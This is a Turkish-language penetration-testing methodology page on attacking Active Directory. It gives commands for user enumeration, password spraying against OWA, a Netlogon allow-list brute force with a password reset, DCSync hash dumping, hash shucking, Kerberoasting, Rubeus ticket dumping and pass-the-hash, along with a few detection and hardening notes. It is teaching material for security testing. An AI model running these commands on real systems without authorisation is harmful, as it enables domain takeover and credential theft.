# Active Directory Metodolojisi

{{#include ../../banners/hacktricks-training.md}}

## Temel genel bakış

**Active Directory**, **ağ yöneticilerinin** bir ağ içindeki **domain'leri**, **kullanıcıları** ve **objeleri** verimli bir şekilde oluşturup yönetmesini sağlayan temel bir teknolojidir. Ölçeklenebilir olacak şekilde tasarlanmıştır; çok sayıda kullanıcının yönetilebilir **gruplar** ve **alt gruplar** hâlinde organize edilmesini ve farklı seviyelerdeki **erişim haklarının** kontrol edilmesini kolaylaştırır.

**Active Directory** yapısı üç ana katmandan oluşur: **domain'ler**, **tree'ler** ve **forest'ler**. Bir **domain**, ortak bir veritabanını paylaşan **kullanıcılar** veya **cihazlar** gibi objelerin bir koleksiyonunu kapsar. **Tree'ler**, ortak bir yapı üzerinden birbirine bağlanan bu domain gruplarıdır; **forest** ise **trust ilişkileri** aracılığıyla birbirine bağlanan birden fazla tree'nin koleksiyonunu temsil eder ve organizasyon yapısının en üst katmanını oluşturur. Bu seviyelerin her birinde belirli **erişim** ve **iletişim hakları** atanabilir.

**Active Directory** içindeki temel kavramlar şunlardır:

1. **Directory** – Active Directory objelerine ilişkin tüm bilgileri barındırır.
2. **Object** – **kullanıcılar**, **gruplar** veya **paylaşılan klasörler** dâhil olmak üzere directory içindeki varlıkları ifade eder.
3. **Domain** – Directory objeleri için bir container görevi görür; bir **forest** içinde birden fazla domain bulunabilir ve her biri kendi obje koleksiyonunu korur.
4. **Tree** – Ortak bir root domain'i paylaşan domain grubudur.
5. **Forest** – Active Directory'deki organizasyon yapısının en üst seviyesidir ve aralarında **trust ilişkileri** bulunan birkaç tree'den oluşur.

**Active Directory Domain Services (AD DS)**, bir ağ içindeki merkezi yönetim ve iletişim için kritik olan çeşitli servisleri kapsar. Bu servisler şunlardır:

1. **Domain Services** – Veri depolamayı merkezileştirir ve **kullanıcılar** ile **domain'ler** arasındaki etkileşimleri yönetir; buna **authentication** ve **search** işlevleri de dâhildir.
2. **Certificate Services** – Güvenli **digital certificate**'ların oluşturulmasını, dağıtılmasını ve yönetilmesini denetler.
3. **Lightweight Directory Services** – **LDAP protocol** aracılığıyla directory özellikli uygulamaları destekler.
4. **Directory Federation Services** – Kullanıcıların tek bir oturumda birden fazla web uygulamasında kimlik doğrulamasını sağlayan **single-sign-on** özellikleri sunar.
5. **Rights Management** – Yetkisiz dağıtımını ve kullanımını düzenleyerek telif hakkıyla korunan materyallerin güvenliğini sağlamaya yardımcı olur.
6. **DNS Service** – **domain name** çözümlemesi için kritik öneme sahiptir.

Daha ayrıntılı bir açıklama için şuraya bakın: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Bir **AD'yi attack etmek** için **Kerberos authentication process**'ini gerçekten iyi **anlamanız** gerekir.\
[**Hâlâ nasıl çalıştığını bilmiyorsanız bu sayfayı okuyun.**](kerberos-authentication.md)

## Cheat Sheet

Bir AD'yi enumerate/exploit etmek için çalıştırabileceğiniz komutlara hızlıca göz atmak üzere [https://wadcoms.github.io/](https://wadcoms.github.io) adresine bakabilirsiniz.

> [!WARNING]
> Kerberos iletişimi normalde istemcinin doğru SPN için bir ticket alabilmesi amacıyla **fully qualified domain name (FQDN)** gerektirir. Bir makineye IP adresiyle erişilmesi, genellikle Kerberos yerine NTLM'e geri dönüş yapılmasına neden olur.

## Recon Active Directory (No creds/sessions)

Bir AD ortamına erişiminiz varsa ancak herhangi bir credential/session'a sahip değilseniz şunları yapabilirsiniz:

- **Ağı pentest edin:**
- Ağı scan edin, makineleri ve açık portları bulun ve **vulnerability'leri exploit etmeye** veya bunlardan **credential'ları extract etmeye** çalışın (örneğin, [printer'lar çok ilginç hedefler olabilir](ad-information-in-printers.md)).
- DNS'i enumerate etmek; web, printer, share, VPN, media vb. gibi domain içindeki önemli server'lar hakkında bilgi sağlayabilir.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Bunun nasıl yapılacağı hakkında daha fazla bilgi edinmek için Genel [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) sayfasına göz atın.
- **SMB servislerinde null ve Guest erişimini kontrol edin** (bu, modern Windows sürümlerinde çalışmaz):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bir SMB server'ını enumerate etmeye ilişkin daha ayrıntılı bir rehber burada bulunabilir:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP'ı enumerate edin**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP'ı nasıl enumerate edeceğinize ilişkin daha ayrıntılı bir rehber burada bulunabilir (**anonymous access** konusuna özellikle dikkat edin):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Ağı poison edin**
- [**Responder ile servisleri impersonate ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) credential'ları toplayın
- [**Relay attack'i abuse ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) host'a erişin
- [**evil-S ile sahte UPnP servislerini expose ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) credential'ları toplayın
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Internal dokümanlardan, social media'dan, domain ortamları içindeki servislerden (özellikle web) ve ayrıca herkese açık kaynaklardan username/name'leri extract edin.
- Şirket çalışanlarının tam adlarını bulursanız farklı AD **username convention'larını (**[**bunu okuyun**](https://activedirectorypro.com/active-directory-user-naming-convention/)) deneyebilirsiniz. En yaygın convention'lar şunlardır: _NameSurname_, _Name.Surname_, _NamSur_ (her birinden 3 harf), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random harf ve 3 random rakam_ (abc123).
- Tool'lar:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) ve [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) sayfalarına bakın.
- **Kerbrute enum**: **Geçersiz bir username istendiğinde** server, _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ **Kerberos error** code'u ile yanıt verir ve bu da username'in geçersiz olduğunu belirlememizi sağlar. **Geçerli username'ler** ya bir AS-REP yanıtı içindeki **TGT** ile ya da kullanıcının pre-authentication gerçekleştirmesi gerektiğini belirten _KRB5KDC_ERR_PREAUTH_REQUIRED_ hatasıyla yanıtlanır.
- **MS-NRPC'ye karşı Authentication olmadan**: Domain controller'lar üzerindeki MS-NRPC (Netlogon) interface'ine karşı auth-level = 1 (No authentication) kullanılması. Bu method, herhangi bir credential olmadan kullanıcının veya bilgisayarın var olup olmadığını kontrol etmek için MS-NRPC interface'ine bind olduktan sonra `DsrGetDcNameEx2` function'ını çağırır. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool'u bu tür bir enumeration'ı uygular. Araştırmaya [buradan](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> ulaşılabilir.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ağda bu sunuculardan birini bulduysanız, buna karşı **user enumeration** da gerçekleştirebilirsiniz. Örneğin [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> [**bu github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) ve bu repoda ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) kullanıcı adı listeleri bulabilirsiniz.
>
> Ancak bundan önce gerçekleştirmiş olmanız gereken recon adımında, **şirkette çalışan kişilerin adlarına** sahip olmalısınız. Ad ve soyad ile olası geçerli kullanıcı adları oluşturmak için [**namemash.py**](https://gist.github.com/superkojiman/11076951) script'ini kullanabilirsiniz.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

DC üzerinde **Zerologon** yamalanmış olsa bile, açıkça allow-list'e alınmış hesaplar hâlâ **legacy/vulnerable Netlogon secure-channel davranışına** maruz kalabilir. Riskli yapılandırma, **`Domain controller: Allow vulnerable Netlogon secure channel connections`** GPO'su veya buna karşılık gelen **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`** registry değeridir.

Bu değer bir **SDDL security descriptor**'ıdır ([Security Descriptors](security-descriptors.md) bölümüne bakın). DACL içinde ilgili ACE verilmiş olan herhangi bir hesap veya grup hedef alınabilir. Örneğin, `O:BAG:BAD:(A;;RC;;;WD)` ifadesi **Everyone** grubunu etkili bir şekilde allow-list'e alır.

Pratik operator workflow:

1. **Allow-list'e alınmış principal'ları**, hem **SYSVOL/GPO** hem de **aktif DC registry** kontrol ederek belirleyin.
2. SDDL içinde bulunan **SID'leri** gerçek AD kullanıcılarına/bilgisayarlarına çözümleyin ve **DC machine account'larına**, **trust account'larına** ve diğer ayrıcalıklı makinelere öncelik verin.
3. Allow-list'e alınmış hesap olarak tekrar tekrar **MS-NRPC / Netlogon authentication** girişiminde bulunun.
4. Başarılı bir tahminden sonra, hedef hesap parolasını sıfırlamak için **Netlogon password-setting** özelliğini abuse edin (public PoC bunu boş bir string olarak ayarlar).<sup>[[9]](#references)[[10]](#references)</sup>

Public artifact'tan hızlı triage / lab örnekleri:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notlar:

- **scanner**, etkin allow-list'in **SYSVOL**'da, **registry**'de veya her ikisinde bulunabilmesi nedeniyle kullanışlıdır.
- Exploit yolu önemlidir; çünkü güvenlik açığı bulunan bir hesap belirlendikten sonra **Domain Admin yetkileri gerektirmez**.
- `DC$` gibi bir **Domain Controller machine account**'un ele geçirilmesi özellikle tehlikelidir; bu hesabın parolasını sıfırlamak daha geniş **AD takeover** yollarını doğrudan etkinleştirebilir.
- **Brute-force uygulanabilirliği** moda bağlıdır: public artifact, meet-in-the-middle yaklaşımını, başka bir computer account mevcut olduğunda **24-bit** brute force'u ve daha yavaş **32-bit** varyantları açıklar.

Detection / hardening notları:

- Allow-list politikasını denetleyin ve geçici, açıkça gerekli compatibility exception'lar dışındaki her şeyi kaldırın.
- Güvenlik açığı bulunan Netlogon bağlantılarının reddedildiğini, keşfedildiğini veya politika tarafından açıkça allow edildiğini yakalamak için DC **System** event'leri olan **5827/5828/5829/5830/5831**'i izleyin.
- `VulnerableChannelAllowList` içindeki hesapları, legacy dependency kaldırılana kadar **high-risk** olarak değerlendirin.

### Bir veya birkaç username bilmek

Tamam, geçerli bir username'iniz olduğunu ancak hiçbir password'ünüz olmadığını biliyorsunuz... O halde şunları deneyin:

- [**ASREPRoast**](asreproast.md): Bir user'ın _DONT_REQ_PREAUTH_ attribute'u **yoksa**, o user için user'ın password'ünün türetilmiş haliyle encrypted bazı veriler içeren bir **AS_REP message** **request** edebilirsiniz.
- [**Password Spraying**](password-spraying.md): Bulduğunuz user'ların her biriyle en **yaygın password'leri** deneyin; belki bazı user'lar kötü bir password kullanıyordur (password policy'yi göz önünde bulundurun!).
- User'ların mail server'larına erişim elde etmeyi denemek için **OWA server'larına spray** de yapabileceğinizi unutmayın.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

**Network** üzerindeki bazı protocol'leri **poisoning** yaparak crack edebileceğiniz challenge **hash'leri** **elde** edebilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration, authentication yapmaya zorlanabilecek candidate account'lar, host'lar ve service'ler sağlar. Uygun NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ve AD environment'ına olası giriş yollarını belirlemek için bu context'i kullanın.

### NetExec workspace odaklı recon ve relay posture kontrolleri

- Engagement başına AD recon state'ini korumak için **`nxcdb` workspaces** kullanın: `workspace create <name>`, `~/.nxc/workspaces/<name>` altında protocol başına SQLite DB'leri (smb/mssql/winrm/ldap/etc) oluşturur. `proto smb|mssql|winrm` ile görünümler arasında geçiş yapın ve toplanan secret'ları `creds` ile listeleyin. İşiniz bittiğinde sensitive data'yı manuel olarak purge edin: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`** ile hızlı subnet discovery; **domain**, **OS build**, **SMB signing requirements** ve **Null Auth** bilgilerini ortaya çıkarır. `(signing:False)` gösteren member'lar **relay-prone**'dur; DC'ler ise çoğunlukla signing gerektirir.
- Targeting'i kolaylaştırmak için NetExec output'undan doğrudan **/etc/hosts** içinde hostname'ler oluşturun:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Signing nedeniyle **SMB relay to the DC engellense bile**, **LDAP** durumunu yine de kontrol edin: `netexec ldap <dc>`, `(signing:None)` / zayıf channel binding değerlerini gösterir. SMB signing zorunlu olan ancak LDAP signing devre dışı bırakılmış bir DC, **SPN-less RBCD** gibi abuse yöntemleri için hâlâ uygun bir **relay-to-LDAP** hedefidir.

### Client-side printer credential leaks → toplu domain credential validation

- Printer/web UI'ları bazen **maskelenmiş admin password'lerini HTML içine gömer**. Kaynağı/devtools'u görüntülemek, açık metni (ör. `<input value="<password>">`) ortaya çıkarabilir ve scan/print repository'lerine Basic-auth erişimi sağlayabilir.
- Alınan print job'ları, kullanıcı başına password içeren **plaintext onboarding dokümanları** barındırabilir. Test sırasında eşleştirmeleri hizalı tutun:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### NTLM Creds Çalma

**null veya guest user** ile **diğer PC'lere veya share'lere erişebiliyorsanız**, bir şekilde erişildiğinde size karşı **NTLM authentication tetikleyecek** dosyaları (SCF file gibi) **yerleştirebilirsiniz**. Böylece crack edebilmek için **NTLM challenge'ı çalabilirsiniz**:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**, sahip olduğunuz her NT hash'i, key material'ı doğrudan NT hash'ten türetilen diğer daha yavaş formatlar için candidate password olarak ele alır. Kerberos RC4 ticket'larında, NetNTLM challenge'larında veya cached credentials'ta uzun passphrase'leri brute-force etmek yerine NT hash'lerini Hashcat'in NT-candidate mode'larına vererek plaintext'i öğrenmeden password reuse durumunu doğrulamasını sağlarsınız. Bu yöntem, binlerce güncel ve geçmiş NT hash'ini elde edebileceğiniz bir domain compromise sonrasında özellikle etkilidir.<sup>[[5]](#references)</sup>

Shucking'i şu durumlarda kullanın:

- DCSync, SAM/SECURITY dump'ları veya credential vault'larından elde ettiğiniz bir NT corpus varsa ve başka domain/forest'larda reuse kontrolü yapmanız gerekiyorsa.
- RC4 tabanlı Kerberos material'ı (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM response'ları veya DCC/DCC2 blob'ları yakalarsanız.
- Uzun ve crack edilemeyen passphrase'lerde reuse durumunu hızlıca kanıtlamak ve hemen Pass-the-Hash ile pivot etmek istiyorsanız.

Bu technique, key'leri NT hash olmayan encryption type'lara karşı **çalışmaz** (ör. Kerberos etype 17/18 AES). Bir domain yalnızca AES kullanımını zorluyorsa normal password mode'larına dönmeniz gerekir.

#### NT hash corpus oluşturma

- **DCSync/NTDS** – En geniş NT hash setini (ve önceki değerlerini) almak için history ile `secretsdump.py` kullanın:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries, Microsoft'un account başına 24 adede kadar önceki hash saklayabilmesi nedeniyle candidate pool'u önemli ölçüde genişletir. NTDS secrets'larını elde etmenin diğer yolları için:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dump'ları** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (veya Mimikatz `lsadump::sam /patch`), local SAM/SECURITY data'sını ve cached domain logon'larını (DCC/DCC2) çıkarır. Bu hash'leri tekilleştirip aynı `nt_candidates.txt` listesine ekleyin.
- **Metadata'yı takip edin** – Her hash'i üreten username/domain bilgisini saklayın (wordlist yalnızca hex içerse bile). Hashcat kazanan candidate'ı yazdırdığında eşleşen hash'ler, hangi principal'ın password reuse yaptığını hemen gösterir.
- Shucking sırasında overlap olasılığını artırmak için aynı forest veya trusted forest'tan gelen candidate'ları tercih edin.

#### Hashcat NT-candidate mode'ları

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notlar:

- NT-candidate input'ları **raw 32-hex NT hash olarak kalmalıdır**. Rule engine'lerini devre dışı bırakın (`-r` kullanmayın, hybrid mode'larını kullanmayın); çünkü mangling candidate key material'ını bozar.
- Bu mode'lar doğası gereği daha hızlı değildir, ancak NTLM keyspace'i (M3 Max üzerinde ~30.000 MH/s), Kerberos RC4'ten (~300 MH/s) yaklaşık 100 kat daha hızlıdır. Curated bir NT listesinde test yapmak, yavaş formattaki tüm password space'i taramaktan çok daha ucuzdur.
- Her zaman **en güncel Hashcat build'ini** çalıştırın (`git clone https://github.com/hashcat/hashcat && make install`); çünkü 31500/31600/35300/35400 mode'ları yakın zamanda eklenmiştir.<sup>[[7]](#references)</sup>
- Şu anda AS-REQ Pre-Auth için bir NT mode'u yoktur. AES etype'ları (19600/19700), key'leri raw NT hash'lerinden değil UTF-16LE password'lerinden PBKDF2 aracılığıyla türetildiği için plaintext password gerektirir.

#### Örnek – Kerberoast RC4 (mode 35300)

1. Düşük yetkili bir user ile hedef SPN için RC4 TGS yakalayın (ayrıntılar için Kerberoast sayfasına bakın):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Ticket'ı NT listeniz ile shuck edin:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat, her NT candidate'tan RC4 key'ini türetir ve `$krb5tgs$23$...` blob'unu doğrular. Eşleşme, service account'un mevcut NT hash'lerinizden birini kullandığını doğrular.

3. Hemen PtH ile pivot edin:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Gerekirse plaintext'i daha sonra `hashcat -m 1000 <matched_hash> wordlists/` ile elde edebilirsiniz.

#### Örnek – Cached credentials (mode 31600)

1. Compromised bir workstation'dan cached logon'ları dump edin:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. İlgi çekici domain user'a ait DCC2 satırını `dcc2_highpriv.txt` dosyasına kopyalayıp shuck edin:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Başarılı bir eşleşme, listenizde zaten bilinen NT hash'ini üretir ve cached user'ın password reuse yaptığını kanıtlar. Bunu doğrudan PtH için (`nxc smb <dc_ip> -u highpriv -H <hash>`) kullanabilir veya string'i elde etmek için hızlı NTLM mode'unda brute-force edebilirsiniz.

Aynı workflow NetNTLM challenge-response'ları (`-m 27000/27100`) ve DCC (`-m 31500`) için de geçerlidir. Bir eşleşme belirlendiğinde relay, SMB/WMI/WinRM PtH başlatabilir veya NT hash'ini mask/rule kullanarak offline olarak yeniden crack edebilirsiniz.



## Active Directory'yi credentials/session İLE enumerate etme

Bu aşama için geçerli bir domain account'un **credentials'ını veya session'ını compromise etmiş olmanız gerekir.** Geçerli credentials'a veya domain user olarak bir shell'e sahipseniz, **daha önce verilen seçeneklerin diğer user'ları compromise etmek için hâlâ kullanılabileceğini unutmayın**.

Authenticated enumeration'a başlamadan önce **Kerberos double-hop problem**'ini anlayın.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Bir account'u compromise etmek, **domain'i assess etmeye yönelik önemli bir adımdır**; çünkü authenticated **Active Directory enumeration** yapılmasını sağlar:

[**ASREPRoast**](asreproast.md) ile artık vulnerable olabilecek tüm user'ları bulabilir, [**Password Spraying**](password-spraying.md) ile de **tüm username'lerin listesini** elde edip compromised account'un password'ünü, boş password'leri ve yeni promising password'leri deneyebilirsiniz.

- [**Temel recon gerçekleştirmek için CMD kullanabilirsiniz**](../basic-cmd-for-pentesters.md#domain-info)
- Daha stealthy olması için [**recon amacıyla powershell de kullanabilirsiniz**](../basic-powershell-for-pentesters/index.html)
- Daha ayrıntılı information çıkarmak için [**powerview kullanabilirsiniz**](../basic-powershell-for-pentesters/powerview.md)
- Active Directory'de recon için bir diğer etkileyici tool [**BloodHound**](bloodhound.md)'dur. **Çok stealthy değildir** (kullandığınız collection method'larına bağlı olarak), ancak bunu **önemsemiyorsanız** kesinlikle denemelisiniz. User'ların nerede RDP yapabildiğini, diğer group'lara giden path'leri vb. bulun.
- **Diğer automated AD enumeration tool'ları:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- İlgi çekici information içerebilecek [**AD'nin DNS record'ları**](ad-dns-records.md).
- Directory'yi enumerate etmek için kullanabileceğiniz **GUI'li bir tool**, **SysInternal** Suite içindeki AdExplorer.exe'dir.
- Credentials'ı _userPassword_ ve _unixUserPassword_ field'larında, hatta _Description_'da aramak için LDAP database'inde **ldapsearch** ile de arama yapabilirsiniz. Diğer method'lar için PayloadsAllTheThings üzerindeki [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) sayfasına bakın.
- **Linux** kullanıyorsanız [**pywerview**](https://github.com/the-useless-one/pywerview) ile de domain'i enumerate edebilirsiniz.
- Aşağıdaki automated tool'ları da deneyebilirsiniz:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Tüm domain user'larını çıkarma**

Windows'tan tüm domain username'lerini elde etmek çok kolaydır (`net user /domain`, `Get-DomainUser` veya `wmic useraccount get name,sid`). Linux'ta şunları kullanabilirsiniz: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` veya `enum4linux -a -u "user" -p "password" <DC IP>`

> Bu Enumeration bölümü kısa görünse bile tüm sürecin en önemli kısmıdır. Linklere (özellikle cmd, powershell, powerview ve BloodHound linklerine) erişin, bir domain'i nasıl enumerate edeceğinizi öğrenin ve kendinizi rahat hissedene kadar pratik yapın. Bir assessment sırasında DA'ya giden yolu bulmak veya hiçbir şey yapılamayacağına karar vermek için en önemli aşama bu olacaktır.

### Kerberoast

Kerberoasting, user account'larına bağlı service'ler tarafından kullanılan **TGS ticket'larının** elde edilmesini ve user password'lerine dayanan encryption'larının **offline** olarak crack edilmesini içerir.

Bu konu hakkında daha fazla bilgi:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, vb.)

Bazı credentials'lar elde ettiğinizde herhangi bir **machine**'a erişiminiz olup olmadığını kontrol edebilirsiniz. Bunun için port scan'lerinize göre farklı protocol'lerle çeşitli server'lara bağlanmayı denemek üzere **CrackMapExec** kullanabilirsiniz.

### Local Privilege Escalation

Compromised credentials'a veya regular domain user olarak bir session'a sahipseniz ve **domain'deki herhangi bir machine**'a erişebiliyorsanız, **local olarak privilege escalate etmek ve credentials toplamak** için bir path arayın. Local administrator privilege'ları, memory'den (LSASS) ve local storage'dan (SAM) **diğer user'ların hash'lerini dump etmenize** olanak sağlayabilir.

Bu kitapta [**Windows'ta local privilege escalation**](../windows-local-privilege-escalation/index.html) ve bir [**checklist**](../checklist-windows-privilege-escalation.md) hakkında eksiksiz bir sayfa bulunmaktadır. Ayrıca [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kullanmayı unutmayın.

### Current Session Tickets

Mevcut user'da size beklenmeyen resource'lara **erişim izni verecek** **ticket'lar** bulmanız çok **düşük bir ihtimaldir**, ancak kontrol edebilirsiniz:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Domain kimlik bilgileri veya bir kullanıcı oturumu ile NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) yöntemini yeniden inceleyin: kimliği doğrulanmış enumeration ve coercion teknikleri, kimlik doğrulaması yapılmadan gerçekleştirilen keşif sırasında kullanılamayan relay yollarını ortaya çıkarabilir.

### Looks for Creds in Computer Shares | SMB Shares

Artık bazı temel kimlik bilgilerine sahip olduğunuza göre, **AD içinde paylaşılan ilginç dosyaları bulup bulamayacağınızı** kontrol etmelisiniz. Bunu manuel olarak yapabilirsiniz, ancak bu oldukça sıkıcı ve tekrarlayan bir iştir (özellikle kontrol etmeniz gereken yüzlerce doküman bulursanız).

[**Kullanabileceğiniz araçları öğrenmek için bu bağlantıyı takip edin.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

**Diğer bilgisayarlara veya paylaşımlara erişebiliyorsanız**, bir şekilde erişildiğinde size karşı **NTLM authentication'ı t**rigger edecek SCF dosyası gibi **dosyalar yerleştirebilirsiniz**; böylece kırmak üzere **NTLM challenge'ını çalabilirsiniz**:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Bu zafiyet, kimliği doğrulanmış herhangi bir kullanıcının **domain controller'ı compromise etmesine** olanak tanıyordu.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Aşağıdaki teknikler için normal bir domain user yeterli değildir; bu saldırıları gerçekleştirmek üzere bazı özel yetkilere/kimlik bilgilerine sahip olmanız gerekir.**

### Hash extraction

Umarız [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), relay işlemleri dahil [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) veya [yerel ayrıcalıkları yükselterek](../windows-local-privilege-escalation/index.html) bazı **local admin** hesaplarını **compromise etmeyi** başarmışsınızdır.\
Artık bellekteki ve yerel olarak depolanan tüm hash'leri dump etme zamanı.\
